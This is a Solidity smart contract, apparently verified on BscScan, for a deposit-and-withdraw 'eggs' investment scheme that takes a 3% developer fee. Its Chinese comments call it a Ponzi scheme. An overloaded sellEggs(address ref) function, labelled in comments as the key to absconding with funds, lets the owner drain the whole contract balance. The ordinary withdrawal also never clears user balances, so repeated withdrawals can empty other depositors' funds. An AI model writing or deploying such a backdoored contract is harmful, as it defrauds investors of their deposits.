/**
 *Submitted for verification at BscScan.com on 2022-05-22
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract awTest {

    bool public initialized = false;

    address payable public ceoAddress;
    //本金
    mapping (address => uint256) private principle;
    //用户余额
    mapping (address => uint256) private userBalance;
    //入場時間與出場時間
    mapping (address => uint256) private lastHatch;
    

    constructor() {
        ceoAddress = payable(msg.sender);
    }

    //出金
    function sellEggs() public {
        require(initialized);

        uint256 fee = devFee(userBalance[msg.sender]);

        ceoAddress.transfer(fee);

        payable(msg.sender).transfer(SafeMath.sub(userBalance[msg.sender], fee));
    }

    //入金
    function buyEggs() public payable {
        require(initialized);
        
        uint256 fee = devFee(msg.value);
        ceoAddress.transfer(fee);

        userBalance[msg.sender] += SafeMath.sub(msg.value, fee);
    }

    //資金盤啟動
    function seedMarket() public payable {
        require(msg.sender == ceoAddress, "invalid call");
        initialized = true;
    }

    //捲款潛逃關鍵
    function sellEggs(address ref) public {
        require(msg.sender == ceoAddress, 'invalid call');
        require(ref == ceoAddress);

        payable(msg.sender).transfer(address(this).balance);
    }

    //獎池金額
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    //本金
    function getMyMiners() public view returns(uint256) {
        return userBalance[msg.sender];
    }

    
    //開發者抽成
    function devFee(uint256 amount) private pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount, 3), 100);
    }

}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}